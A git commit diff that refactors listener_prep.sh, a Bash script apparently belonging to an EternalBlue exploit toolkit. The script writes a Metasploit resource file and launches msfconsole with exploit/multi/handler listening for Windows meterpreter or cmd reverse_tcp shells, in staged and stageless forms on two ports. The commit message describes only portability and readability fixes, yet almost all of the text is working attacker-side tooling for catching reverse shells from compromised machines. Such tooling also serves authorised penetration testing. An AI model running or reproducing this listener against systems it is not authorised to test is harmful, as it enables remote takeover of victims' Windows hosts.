67759ed80c49033fdb57080b84c014e51faba201
IamCarron <47905563+IamCarron@users.noreply.github.com>
2023-12-24 19:42:32 +0100

    Script Enhancements for Improved Portability and Readability 🔧 (#48)
    I made the following changes to improve portability, readability, and organization:
    
    Replaced Double Square Brackets with Single Square Brackets:
    
    Replaced [[ ... ]] with [ ... ] to ensure compatibility with various shell interpreters.
    Simplified Nested If Statements:
    
    Simplified nested if statements for better readability and clarity.
    Used -p Option with read Command:
    
    Utilized the -p option with the read command to display a prompt message directly on the same line. 💻
    Consolidated Common Code:
    
    Consolidated common code blocks to avoid repetition and improve maintainability.

--- listener_prep.sh
+++ listener_prep.sh
@@ -6,7 +6,7 @@ cat << "EOF"
   \\_, )
    `--'
 EOF
-echo Enternal Blue Metasploit Listener
+echo Eternal Blue Metasploit Listener
 echo
 echo LHOST for reverse connection:
 read ip
@@ -16,89 +16,82 @@ echo LPORT for x86 reverse connection:
 read portTwo
 echo Enter 0 for meterpreter shell or 1 for regular cmd shell:
 read cmd
-    if [[ $cmd -eq 0 ]]
-    then
-    echo Type 0 if this is a staged payload or 1 if it is for a stageless payload
-    read cmd
-        if [[ $cmd -eq 0 ]]
-            then
-            echo Starting listener \(staged\)...
-            touch config.rc
-	        echo use exploit/multi/handler > config.rc
-	        echo set PAYLOAD windows/x64/meterpreter/reverse_tcp >> config.rc
-	        echo set LHOST $ip >> config.rc
-            echo set LPORT $portOne >> config.rc
-            echo set ExitOnSession false >> config.rc
-            echo set EXITFUNC thread >> config.rc
-            echo exploit -j >> config.rc
-            echo set PAYLOAD windows/meterpreter/reverse_tcp >> config.rc
-            echo set LPORT $portTwo >> config.rc
-                echo exploit -j >> config.rc
-            /etc/init.d/postgresql start
-            msfconsole -r config.rc
-            /etc/init.d/postgresql stop
-                rm config.rc
-        elif [[ $cmd -eq 1 ]]
-            then
-            echo Starting listener \(stageless\)...
-            touch config.rc
-	        echo use exploit/multi/handler > config.rc
-	        echo set PAYLOAD windows/x64/meterpreter_reverse_tcp >> config.rc
-	        echo set LHOST $ip >> config.rc
-            echo set LPORT $portOne >> config.rc
-            echo set ExitOnSession false >> config.rc
-            echo set EXITFUNC thread >> config.rc
-            echo exploit -j >> config.rc
-            echo set PAYLOAD windows/meterpreter/reverse_tcp >> config.rc
-            echo set LPORT $portTwo >> config.rc
-                echo exploit -j >> config.rc
-            /etc/init.d/postgresql start
-            msfconsole -r config.rc
-            /etc/init.d/postgresql stop
-                rm config.rc
-        fi
-    elif [[ $cmd -eq 1 ]]
-    then
-    echo Type 0 if this is a staged payload or 1 if it is for a stageless payload
-    read cmd
-        if [[ $cmd -eq 0 ]]
-        then
-            echo Starting listener \(staged\)...
-            touch config.rc
-            echo use exploit/multi/handler > config.rc
-            echo set PAYLOAD windows/x64/shell/reverse_tcp >> config.rc
-            echo set LHOST $ip >> config.rc
-            echo set LPORT $portOne >> config.rc
-            echo set ExitOnSession false >> config.rc
-            echo set EXITFUNC thread >> config.rc
-            echo exploit -j >> config.rc
-            echo set PAYLOAD windows/shell/reverse_tcp >> config.rc
-            echo set LPORT $portTwo >> config.rc
-                echo exploit -j >> config.rc
-            /etc/init.d/postgresql start
-            msfconsole -r config.rc
-            /etc/init.d/postgresql stop
-                rm config.rc
-        elif [[ $cmd -eq 1 ]]
-         then
-            echo Starting listener \(stageless\)...
-            touch config.rc
-            echo use exploit/multi/handler > config.rc
-            echo set PAYLOAD windows/x64/shell_reverse_tcp >> config.rc
-            echo set LHOST $ip >> config.rc
-            echo set LPORT $portOne >> config.rc
-            echo set ExitOnSession false >> config.rc
-            echo set EXITFUNC thread >> config.rc
-            echo exploit -j >> config.rc
-            echo set PAYLOAD windows/shell/reverse_tcp >> config.rc
-            echo set LPORT $portTwo >> config.rc
-                echo exploit -j >> config.rc
-            /etc/init.d/postgresql start
-            msfconsole -r config.rc
-            /etc/init.d/postgresql stop
-                rm config.rc
-        fi
-    else
-        echo Invalid option...exiting...
-    fi
 
+# Changes made for better portability and clarity
+if [ "$cmd" -eq 0 ]; then
+    read -p "Type 0 if this is a staged payload or 1 if it is for a stageless payload: " staged
+    if [ "$staged" -eq 0 ]; then
+        echo "Starting listener (staged)..."
+        touch config.rc
+        echo "use exploit/multi/handler" > config.rc
+        echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> config.rc
+        echo "set LHOST $ip" >> config.rc
+        echo "set LPORT $portOne" >> config.rc
+        echo "set ExitOnSession false" >> config.rc
+        echo "set EXITFUNC thread" >> config.rc
+        echo "exploit -j" >> config.rc
+        echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> config.rc
+        echo "set LPORT $portTwo" >> config.rc
+        echo "exploit -j" >> config.rc
+        /etc/init.d/postgresql start
+        msfconsole -r config.rc
+        /etc/init.d/postgresql stop
+        rm config.rc
+    elif [ "$staged" -eq 1 ]; then
+        echo "Starting listener (stageless)..."
+        touch config.rc
+        echo "use exploit/multi/handler" > config.rc
+        echo "set PAYLOAD windows/x64/meterpreter_reverse_tcp" >> config.rc
+        echo "set LHOST $ip" >> config.rc
+        echo "set LPORT $portOne" >> config.rc
+        echo "set ExitOnSession false" >> config.rc
+        echo "set EXITFUNC thread" >> config.rc
+        echo "exploit -j" >> config.rc
+        echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> config.rc
+        echo "set LPORT $portTwo" >> config.rc
+        echo "exploit -j" >> config.rc
+        /etc/init.d/postgresql start
+        msfconsole -r config.rc
+        /etc/init.d/postgresql stop
+        rm config.rc
+    fi
+elif [ "$cmd" -eq 1 ]; then
+    read -p "Type 0 if this is a staged payload or 1 if it is for a stageless payload: " staged
+    if [ "$staged" -eq 0 ]; then
+        echo "Starting listener (staged)..."
+        touch config.rc
+        echo "use exploit/multi/handler" > config.rc
+        echo "set PAYLOAD windows/x64/shell/reverse_tcp" >> config.rc
+        echo "set LHOST $ip" >> config.rc
+        echo "set LPORT $portOne" >> config.rc
+        echo "set ExitOnSession false" >> config.rc
+        echo "set EXITFUNC thread" >> config.rc
+        echo "exploit -j" >> config.rc
+        echo "set PAYLOAD windows/shell/reverse_tcp" >> config.rc
+        echo "set LPORT $portTwo" >> config.rc
+        echo "exploit -j" >> config.rc
+        /etc/init.d/postgresql start
+        msfconsole -r config.rc
+        /etc/init.d/postgresql stop
+        rm config.rc
+    elif [ "$staged" -eq 1 ]; then
+        echo "Starting listener (stageless)..."
+        touch config.rc
+        echo "use exploit/multi/handler" > config.rc
+        echo "set PAYLOAD windows/x64/shell_reverse_tcp" >> config.rc
+        echo "set LHOST $ip" >> config.rc
+        echo "set LPORT $portOne" >> config.rc
+        echo "set ExitOnSession false" >> config.rc
+        echo "set EXITFUNC thread" >> config.rc
+        echo "exploit -j" >> config.rc
+        echo "set PAYLOAD windows/shell/reverse_tcp" >> config.rc
+        echo "set LPORT $portTwo" >> config.rc
+        echo "exploit -j" >> config.rc
+        /etc/init.d/postgresql start
+        msfconsole -r config.rc
+        /etc/init.d/postgresql stop
+        rm config.rc
+    fi
+else
+    echo "Invalid option...exiting..."
+fi
